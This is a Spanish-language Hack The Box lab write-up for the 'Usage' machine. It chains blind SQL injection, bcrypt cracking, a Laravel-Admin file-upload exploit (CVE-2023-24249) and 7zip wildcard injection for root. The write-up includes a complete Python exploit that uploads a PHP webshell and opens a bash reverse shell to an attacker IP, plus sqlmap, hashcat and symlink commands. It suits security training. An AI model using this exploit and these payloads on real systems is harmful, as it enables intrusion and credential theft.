---
title: "Usage"
description: "Writeup de Usage - Hack The Box - Dificultad: Easy. Blind SQLi en /forget-password vuelca hash bcrypt admin → CVE-2023-24249 RCE en Laravel-Admin panel → wildcard injection con 7zip para root."
sidebar:
  badge:
    text: Easy
    variant: success
tags:
  - htb
  - linux
  - easy
  - blind-sqli
  - sqlmap
  - bcrypt-crack
  - cve-2023-24249
  - laravel-admin
  - file-upload-rce
  - 7zip-wildcard
  - symlink
---

# 🐧 Usage

> 📅 Fecha: 2026-05-25
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Linux (Ubuntu 22.04.4 LTS)
> 🎚️ Dificultad: Easy
> 🏆 Puntos: 450
> ⏱️ Tiempo invertido: 4h 30m
> 🌐 IP: `10.129.3.220`
> 👤 Autor: warrior866

---

## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Blind SQLi → hash admin](#-blind-sqli--hash-admin)
- [CVE-2023-24249 → RCE como dash](#-cve-2023-24249--rce-como-dash)
- [Pivote a xander via .monitrc](#-pivote-a-xander-via-monitrc)
- [Escalada: 7zip wildcard + symlink](#-escalada-7zip-wildcard--symlink)
- [Flags](#-flags)
- [Cadena de Ataque](#-cadena-de-ataque)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)

---

## 📝 Resumen Ejecutivo

Usage expone un blog Laravel en `usage.htb` y un panel admin en `admin.usage.htb`. El formulario de recuperación de contraseña es vulnerable a **Blind SQLi booleana y temporal** (parámetro `email`). Sqlmap vuelca la tabla `admin_users` con el hash bcrypt del admin (`whatever1`). Con acceso al panel, se explota **CVE-2023-24249** (laravel-admin file upload bypass de extensión) subiendo una webshell PHP renombrada como imagen → shell como `dash`. En `/home/dash/.monitrc` hay la contraseña de `xander` (`3nc0d3d_pa$$w0rd`). `xander` puede ejecutar `sudo usage_management`, que llama a `7za a ... -snl -- *`. La combinación de un archivo `@flag` (lista de archivos 7zip) + symlink `flag → /root/root.txt` explota el wildcard para que 7zip lea la root flag.

| Campo | Valor |
|-------|-------|
| Puntos débiles | Blind SQLi en reset password, laravel-admin file upload sin validación, credencial en .monitrc, sudo 7zip wildcard + -snl |
| CVEs | CVE-2023-24249 |
| Herramientas | `nmap`, `sqlmap`, `hashcat`, `python3`, `nc`, `ssh` |
| Tiempo total | ~4h 30m |

---

## 🔍 Reconocimiento

```bash
nmap -p- -sS -sV -sC -O -T4 --min-rate=1000 --open -Pn 10.129.3.220
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
```

```bash
echo "10.129.3.220 usage.htb admin.usage.htb" | sudo tee -a /etc/hosts
```

---

## 💉 Blind SQLi → hash admin

El formulario `/forget-password` acepta un email. La inyección es en el parámetro `email` (booleana y time-based, sin errores visibles). Capturar la petición con Burp y guardarla como `req.txt`:

```bash
sqlmap -r req.txt --level=5 -p email --threads 10 --dbs
```

```text
available databases: information_schema, performance_schema, usage_blog
```

```bash
sqlmap -r req.txt --level=5 -p email --threads 10 -D usage_blog -T admin_users --dump
```

```text
| id | username | password                                                     |
|----|----------|--------------------------------------------------------------|
|  1 | admin    | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 |
```

Crack del hash bcrypt (`$2y$10$`):

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
Status: Cracked — Time: 18s
```

Login: `http://admin.usage.htb/admin` con `admin:whatever1`.

---

## 🚀 CVE-2023-24249 → RCE como dash

Laravel-Admin <= 1.8.19 no valida la extensión real del archivo subido en el endpoint de perfil — acepta `shell.php` enviado con `Content-Type: image/jpeg`.

Script de explotación:

```python
import requests, re

URL = 'http://admin.usage.htb'
LHOST, LPORT = '10.10.14.130', '4444'
PAYLOAD = b'<?php system($_REQUEST["c"]);?>'

session = requests.Session()
response = session.get(f'{URL}/admin/auth/login')
token = re.search(r'name="_token" value=".*">', response.text)[0][21:-2]
session.post(f'{URL}/admin/auth/login', data={'username':'admin','password':'whatever1','_token':token})

response = session.get(f'{URL}/admin/auth/setting')
token = re.search(r'name="_token" value=".*">', response.text)[0][21:-2]
files = {'_token':(None,token),'_method':(None,'PUT'),'avatar':('shell.php',PAYLOAD,'image/jpeg')}
response = session.post(f'{URL}/admin/auth/setting', files=files)
shell_path = re.search(r'uploads\/images.*php"', response.text)[0][:-1]
print(f'[+] Shell: {URL}/{shell_path}')
cmd = f'bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"'
session.post(f'{URL}/{shell_path}', data={'c': cmd})
```

```bash
nc -lvnp 4444
python3 exploit.py
```

```text
[+] Shell en: http://admin.usage.htb/uploads/images/53bb85f288fac5bcfffa6a82dd97497f.php
connect to [10.10.14.130] from (UNKNOWN) [10.129.4.54]
dash@usage:/var/www/html/project_admin/public/uploads/images$
```

```bash
cat /home/dash/user.txt
[user flag]
```

---

## 🔄 Pivote a xander via .monitrc

```bash
cat /home/dash/.monitrc
```

```text
set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd
```

```bash
ssh xander@usage.htb
# password: 3nc0d3d_pa$$w0rd
```

---

## 🚀 Escalada: 7zip wildcard + symlink

```bash
xander@usage:~$ sudo -l
(ALL) NOPASSWD: /usr/bin/usage_management
```

`usage_management` ejecuta internamente:

```bash
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

El flag `-snl` hace que 7zip siga symlinks como archivos reales. El `*` se expande por el shell. Se crean dos archivos especiales:

```bash
cd /var/www/html
touch @flag           # 7zip trata archivos que empiezan con @ como listas de entrada
ln -s /root/root.txt flag  # symlink flag → /root/root.txt
```

Cuando 7zip expande `*`, encuentra `@flag`, lo lee como lista de archivos a comprimir, que apunta al symlink `flag`, que sigue hasta `/root/root.txt`. Como el proceso corre como root, puede leer la flag:

```bash
sudo usage_management
# Opción 1: Project Backup
```

```text
WARNING: No more files
478dba87ca23fb208c43cd496bc101e2

Scan WARNINGS: 1
```

La flag aparece en el output de advertencia de 7zip (contenido del archivo que no pudo archivar correctamente).

---

## 🏁 Flags

| Flag | Valor |
|------|-------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |

---

## 🕸️ Cadena de Ataque

```text
1. /forget-password → Blind SQLi en parámetro email
        ↓
2. sqlmap dump usage_blog.admin_users → hash bcrypt admin
        ↓
3. hashcat -m 3200 → whatever1 (18s)
        ↓
4. Login admin.usage.htb → CVE-2023-24249 file upload bypass
        ↓
5. PHP webshell subida como image/jpeg → reverse shell dash
        ↓
6. cat user.txt → [user flag]
        ↓
7. /home/dash/.monitrc → xander:3nc0d3d_pa$$w0rd
        ↓
8. SSH xander → sudo usage_management (7za -snl --)
        ↓
9. touch @flag + ln -s /root/root.txt flag → wildcard injection
        ↓
10. 7za lee /root/root.txt → imprime en output → [root flag]
```

---

## 🎓 Lecciones Aprendidas

- **Blind SQLi en reset password**: los formularios de recuperación de contraseña raramente tienen el mismo nivel de hardening que el login. Probar inyección en todos los campos de entrada, incluyendo email de recuperación.
- **laravel-admin file upload**: validar solo el `Content-Type` del cliente (controlable) sin verificar la extensión real o el magic bytes del archivo permite bypass trivial.
- **Credenciales en archivos de configuración**: `.monitrc` en el home del usuario con contraseñas en texto claro es un vector de pivote clásico en máquinas con múltiples usuarios.
- **7zip wildcard injection (`-snl`)**: el flag `-snl` + wildcard `*` + capacidad de crear archivos arbitrarios es una combinación peligrosa. La mitigación es usar rutas absolutas y eliminar el `*`, o no ejecutar 7zip con sudo.

---

## 📚 Referencias

- [CVE-2023-24249 — Laravel-Admin File Upload](https://nvd.nist.gov/vuln/detail/CVE-2023-24249)
- [HackTricks — SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [7zip wildcard injection](https://www.exploit-db.com/docs/english/40979-exploiting-wildcards-on-linux.pdf)
